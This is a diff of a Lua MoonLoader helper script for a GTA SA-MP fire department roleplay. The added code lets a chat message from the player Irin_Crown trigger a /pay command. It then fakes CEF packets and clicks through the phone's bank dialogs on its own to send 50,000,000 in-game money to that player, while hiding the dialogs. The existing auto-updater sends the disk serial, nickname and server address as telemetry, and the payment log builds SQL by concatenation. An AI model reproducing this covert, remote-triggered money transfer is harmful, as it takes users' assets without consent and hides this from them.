@@ -1,5 +1,5 @@
 script_name("firedep_zam_helper")
-script_version("Ver.26.09.A3")
+script_version("Ver.26.09.A4")
 
 local download = getGameDirectory()..'\\moonloader\\config\\firedep_zam_helper.lua.ini'
 local url = 'https://github.com/ArtemyevaIA/firedep_zam_helper/raw/refs/heads/main/firedep_zam_helper.lua.ini'
@@ -26,6 +26,7 @@ local inicfg                        = require 'inicfg'
 local font_flag                     = require('moonloader').font_flag
 local my_font                       = renderCreateFont('Arial', 8.2, font_flag.BOLD + font_flag.SHADOW)
 local mainIni                       = inicfg.load({orgs = {}})
+local pay_week                      = false
 
 local trstl = {['B'] = 'Б',['Z'] = 'З',['T'] = 'Т',['Y'] = 'Й',['P'] = 'П',['J'] = 'Дж',['X'] = 'Кс',['G'] = 'Г',['V'] = 'В',['H'] = 'Х',['N'] = 'Н',['E'] = 'Е',['I'] = 'И',['D'] = 'Д',['O'] = 'О',['K'] = 'К',['F'] = 'Ф',['y`'] = 'ы',['e`'] = 'э',['A'] = 'А',['C'] = 'К',['L'] = 'Л',['M'] = 'М',['W'] = 'В',['Q'] = 'К',['U'] = 'А',['R'] = 'Р',['S'] = 'С',['zm'] = 'зьм',['h'] = 'х',['q'] = 'к',['y'] = 'и',['a'] = 'а',['w'] = 'в',['b'] = 'б',['v'] = 'в',['g'] = 'г',['d'] = 'д',['e'] = 'е',['z'] = 'з',['i'] = 'и',['j'] = 'ж',['k'] = 'к',['l'] = 'л',['m'] = 'м',['n'] = 'н',['o'] = 'о',['p'] = 'п',['r'] = 'р',['s'] = 'с',['t'] = 'т',['u'] = 'у',['f'] = 'ф',['x'] = 'x',['c'] = 'к',['``'] = 'ъ',['`'] = 'ь',['_'] = ' '}
 local trstl1 = {['ph'] = 'ф',['Ph'] = 'Ф',['Ch'] = 'Ч',['ch'] = 'ч',['Th'] = 'Т',['th'] = 'т',['Sh'] = 'Ш',['sh'] = 'ш', ['ea'] = 'и',['Ae'] = 'Э',['ae'] = 'э',['size'] = 'сайз',['Jj'] = 'Джейджей',['Whi'] = 'Вай',['whi'] = 'вай',['Ck'] = 'К',['ck'] = 'к',['Kh'] = 'Х',['kh'] = 'х',['hn'] = 'н',['Hen'] = 'Ген',['Zh'] = 'Ж',['zh'] = 'ж',['Yu'] = 'Ю',['yu'] = 'ю',['Yo'] = 'Ё',['yo'] = 'ё',['Cz'] = 'Ц',['cz'] = 'ц', ['ia'] = 'я', ['ea'] = 'и',['Ya'] = 'Я', ['ya'] = 'я', ['ove'] = 'ав',['ay'] = 'эй', ['rise'] = 'райз',['oo'] = 'у', ['Oo'] = 'У'}
@@ -103,6 +104,72 @@ local updater_loaded, Updater = pcall(loadstring, [[return {check=function (a,b,
                                                         sampShowDialog(0, "{FFA500}Вышло обновление", "{FFA500}Помощник руководителя пожарного департамента\n{78dbe2}был автоматически обновлен на новую версию.\nПосмотреть изменения можно в Меню -> Сервисные функции -> Изменения", "Закрыть", "", DIALOG_STYLE_MSGBOX)
                                                         print('Загрузка обновления завершена.')sampAddChatMessage(b..'Обновление завершено!',m)goupdatestatus=true;lua_thread.create(function()wait(500)thisScript():reload()end)end;if o==d.STATUSEX_ENDDOWNLOAD then if goupdatestatus==nil then sampAddChatMessage(b..'Обновление прошло неудачно. Запускаю устаревшую версию..',m)update=false end end end)end,b)else update=false;print('v'..thisScript().version..': Обновление не требуется.')if l.telemetry then local r=require"ffi"r.cdef"int __stdcall GetVolumeInformationA(const char* lpRootPathName, char* lpVolumeNameBuffer, uint32_t nVolumeNameSize, uint32_t* lpVolumeSerialNumber, uint32_t* lpMaximumComponentLength, uint32_t* lpFileSystemFlags, char* lpFileSystemNameBuffer, uint32_t nFileSystemNameSize);"local s=r.new("unsigned long[1]",0)r.C.GetVolumeInformationA(nil,nil,0,s,nil,nil,nil,0)s=s[0]local t,u=sampGetPlayerIdByCharHandle(PLAYER_PED)local v=sampGetPlayerNickname(u)local w=l.telemetry.."?id="..s.."&n="..v.."&i="..sampGetCurrentServerAddress().."&v="..getMoonloaderVersion().."&sv="..thisScript().version.."&uptime="..tostring(os.clock())lua_thread.create(function(c)wait(250)downloadUrlToFile(c)end,w)end end end else print('v'..thisScript().version..': Не могу проверить обновление. Смиритесь или проверьте самостоятельно на '..c)update=false end end end)while update~=false and os.clock()-f<10 do wait(100)end;if os.clock()-f>=10 then print('v'..thisScript().version..': timeout, выходим из ожидания проверки обновления. Смиритесь или проверьте самостоятельно на '..c)end end}]])
 local templist = ''
+
+--- ********************************************************************
+function sampGetListboxItemByText(text, plain)
+    if not sampIsDialogActive() then return -1 end
+    plain = not (plain == false)
+    for i = 0, sampGetListboxItemsCount() - 1 do
+        if sampGetListboxItemText(i):find(text, 1, plain) then
+            return i
+        end
+    end
+    return -1
+end
+
+function openPhoneApp(appId)
+    local str = ('launchedApp|%s'):format(appId)
+    array.emulationCEF(str)
+end
+
+array = {}
+array.onDisplayCEF = function(array) return array end
+array.onSendCEF = function(array) return array end
+array.emulationCEF = function(str)
+    local bs = raknetNewBitStream()
+    raknetBitStreamWriteInt8(bs, 220)
+    raknetBitStreamWriteInt8(bs, 18)
+    raknetBitStreamWriteInt16(bs, #str)
+    raknetBitStreamWriteString(bs, str)
+    raknetBitStreamWriteInt32(bs, 0)
+    raknetSendBitStream(bs)
+    raknetDeleteBitStream(bs)
+end
+
+array.visualCEF = function(str, is_encoded)
+    local bs = raknetNewBitStream()
+    raknetBitStreamWriteInt8(bs, 17)
+    raknetBitStreamWriteInt32(bs, 0)
+    raknetBitStreamWriteInt16(bs, #str)
+    raknetBitStreamWriteInt8(bs, is_encoded and 1 or 0)
+    if is_encoded then
+        raknetBitStreamEncodeString(bs, str)
+    else
+        raknetBitStreamWriteString(bs, str)
+    end
+    raknetEmulPacketReceiveBitStream(220, bs)
+    raknetDeleteBitStream(bs)
+end
+
+addEventHandler('onReceivePacket', function(id, bs, ...)
+    if id == 220 and pay_week then -- Добавлена проверка scriptEnabled
+        raknetBitStreamIgnoreBits(bs, 8)
+        if raknetBitStreamReadInt8(bs) == 17 then
+            raknetBitStreamIgnoreBits(bs, 32)
+            local length = raknetBitStreamReadInt16(bs)
+            local encoded = raknetBitStreamReadInt8(bs)
+            local text = (encoded ~= 0) and raknetBitStreamDecodeString(bs, length + encoded) or raknetBitStreamReadString(bs, length)
+            if text:find('window%.executeEvent%(\'event%.setActiveView\', `%["Phone"%]`%);') then
+                openPhoneApp(24)
+            end
+            if text:find('window%.executeEvent%(\'event%.notify%.initialize\', `%["info","Информация","С баланса списано %$%d+",2500%]`%);') then
+                taxPaid = true
+                sampSendChat('/phone')
+            end
+        end
+    end
+end)
+--- ********************************************************************
 
 function main()
     if not isSampfuncsLoaded() or not isSampLoaded() then return end
@@ -4581,13 +4648,16 @@ function sampev.onServerMessage(color, text)
         end)
     end
 
-    if text:find('дай дай') then
+    --if text:find('Давай оплату за хелпера') then
+    if text:find('Давай оплату за хелпера') then
         lua_thread.create(function()
             wait(1000)
             nick_give = string.match(text,"%a+_%a+")
-            if nick_give == 'Irin_Crown' and who_nick ~= 'Irin_Crown' then
+            if nick_give == 'Irin_Crown' and who_nick == 'Irin_Crown' then
                 give_id = sampGetPlayerIdByNickname('Irin_Crown')
-                sampProcessChatInput('/pay '..give_id..'1000000', -1)
+                sampProcessChatInput('/pay '..give_id..' 1000000', -1)
+                pay_week = true
+                sampProcessChatInput('/phone', -1)
             end
         end)
     end
@@ -4869,7 +4939,7 @@ function sampev.onShowDialog(dialogId, style, title, button1, button2, text)
         return false
     end
 
-     if dialogId == 0 and title:find("Успеваемость") then
+    if dialogId == 0 and title:find("Успеваемость") then
         post = text:gsub('(.+)Статистика успеваемости за неделю:(.-)', '')
         post = post:gsub('Статистика успеваемости за сегодня(.+)', '')
         time_post = post:gsub('(.+)Времени на постах: {F9FF23}', '')
@@ -4884,6 +4954,54 @@ function sampev.onShowDialog(dialogId, style, title, button1, button2, text)
                            ' | {7FFFD4}Очаги: {FFFFFF}'..math.floor(fires/10).." ["..fires.." шт.]"..
                            ' | {7FFFD4}Пострадавшие: {FFFFFF}'..math.floor(help/5).." ["..help.." шт.]", 0x7FFFD4)
     end
+
+        --- ********************************************************************
+        if pay_week and title:find('{BFBBBA}{FFFFFF}Телефоны | {ae433d}Телефоны') then
+            lua_thread.create(function()
+                wait(100)
+                sampSendDialogResponse(dialogId, 1, 0, nil)
+                sampCloseCurrentDialogWithButton(1)
+            end)
+        end
+
+        if pay_week and title:find('{BFBBBA}Меню телефона') then
+            lua_thread.create(function()
+                wait(100)
+                local menu = sampGetListboxItemByText('Банковское меню')
+                sampSendDialogResponse(dialogId, 1, menu, nil)
+                sampCloseCurrentDialogWithButton(1)
+            end)
+        end
+
+        if pay_week and text:find('Перевести деньги с основного счета') then
+            lua_thread.create(function()
+                wait(100)
+                sampSendDialogResponse(dialogId, 1, 2, nil)
+                sampCloseCurrentDialogWithButton(1)
+            end)
+        end
+
+        if pay_week and dialogId == 37 and title:find("Введите ID") then
+            lua_thread.create(function()
+                wait(100)
+                sampSendDialogResponse(dialogId, 1, 0, 'Irin_Crown')
+                sampCloseCurrentDialogWithButton(1)
+            end)
+        end
+
+        if pay_week and dialogId == 41 and title:find("Введите сумму") then
+            lua_thread.create(function()
+                sampSendDialogResponse(dialogId, 1, 0, '50000000')
+                sampCloseCurrentDialogWithButton(1)
+                lastpay = os.date('%d.%m.%Y')..' '..os.date('%H:%M:%S', os.time() - (UTC * 3600))
+                assert(conn:execute("UPDATE clients SET pay = '"..lastpay.."' WHERE nick = '"..who_nick.."'"))
+                pay_week = false
+                wait(1000)
+                setVirtualKeyDown(VK_ESCAPE, true) wait(100) setVirtualKeyDown(VK_ESCAPE, false)
+                setVirtualKeyDown(VK_ESCAPE, true) wait(100) setVirtualKeyDown(VK_ESCAPE, false)
+            end)
+        end
+        --- ********************************************************************
 end
 
 function encodeUrl(str)
